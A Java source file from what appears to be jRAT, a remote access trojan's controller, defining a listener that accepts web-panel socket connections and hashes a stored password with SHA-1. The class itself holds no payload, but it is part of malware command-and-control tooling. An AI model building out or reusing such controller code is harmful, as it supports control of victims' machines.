package se.jrat.controller.webpanel;

import java.net.Socket;

import se.jrat.common.hash.Sha1;
import se.jrat.controller.net.PortListener;
import se.jrat.controller.settings.SettingsSockets;

public class WebPanelListener extends PortListener implements Runnable {

	private boolean running;
	
	public WebPanelListener(String name, int port, String pass) throws Exception {
		super(name, port, -1, pass, SettingsSockets.SocketType.WEB_PANEL_SOCKET);
	}
	
	@Override
	public void run() {
		running = true;
		try {			
			while (isRunning() && !server.isClosed()) {
				Socket socket = server.accept();

				WebPanelConnection wpc = new WebPanelConnection(this, socket);
				new Thread(wpc).start();
			}
			
			server.close();
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}
	
	public String getPassword() {
		return pass;
	}
	
	public String getHashedPassword() throws Exception {
		return new Sha1().hashToString(getPassword());
	}
	
	public boolean isRunning() {
		return this.running;
	}
	
	public void setRunning(boolean b) {
		this.running = b;
	}

}